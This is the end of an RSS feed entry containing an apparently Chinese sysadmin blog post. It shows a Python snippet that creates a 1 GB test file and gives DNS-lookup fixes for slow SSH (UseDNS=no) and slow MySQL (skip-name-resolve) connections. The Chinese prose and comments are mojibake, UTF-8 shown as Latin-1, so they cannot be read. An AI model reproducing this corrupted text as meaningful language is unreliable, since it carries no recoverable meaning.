    #é¦–å…ˆä»¥è·¯å¾„pathæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶è®¾ç½®æ¨¡å¼ä¸ºå†™
    file = open(path,&#39;w&#39;)
    #æ ¹æ®æ–‡ä»¶å¤§å°ï¼Œåç§»æ–‡ä»¶è¯»å–ä½ç½®
    file.seek(1024*1024*1024*size)#å§‘ä¸”ä»¥GBä¸ºå•ä½å§
    #ç„¶ååœ¨å½“å‰ä½ç½®å†™å…¥ä»»ä½•å†…å®¹ï¼Œå¿…é¡»è¦å†™å…¥ï¼Œä¸ç„¶æ–‡ä»¶ä¸ä¼šé‚£ä¹ˆå¤§å“¦
    file.write(&#39;\x00&#39;)
    file.close()

gen_file(&#39;./test.dat&#39;,1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;scpä¸Šå»,é€Ÿåº¦åœ¨å…†çº§åˆ«..&lt;/p&gt;

&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;

&lt;p&gt;ç”¨&lt;code&gt;ssh -v&lt;/code&gt; æ‰¾åˆ°Hangçš„åœ°æ–¹,æœä¸€ä¸‹ç›¸å…³ä¿¡æ¯,å¾ˆå¿«å°±èƒ½æ‰¾åˆ°éœ€è¦æ”¹å“ªé‡Œ.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vim /etc/ssh/sshd_config
UseDNS=no
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é‡å¯&lt;code&gt;sudo service ssh restart&lt;/code&gt;è§£å†³é—®é¢˜&lt;/p&gt;

&lt;h2 id=&#34;mysql&#34;&gt;Mysql&lt;/h2&gt;

&lt;p&gt;mysql å®¢æˆ·ç«¯ä¹Ÿæœ‰&lt;code&gt;--verbose&lt;/code&gt;çš„é€‰é¡¹,ä½†æ˜¯è®¾ç½®äº†è²Œä¼¼æ²¡ä»€ä¹ˆç»“æœ.æœäº†ä¸€ä¸‹,å¾ˆå¤šè¯´ä¹Ÿæ˜¯DNSçš„åŸå› &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;show variables
| skip_name_resolve                                 | OFF                                                                                                                     |

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¿®æ”¹ &lt;code&gt;vim /etc/mysql/my.cnf&lt;/code&gt;
å¢åŠ ä¸€è¡Œ &lt;code&gt;skip-name-resolve&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>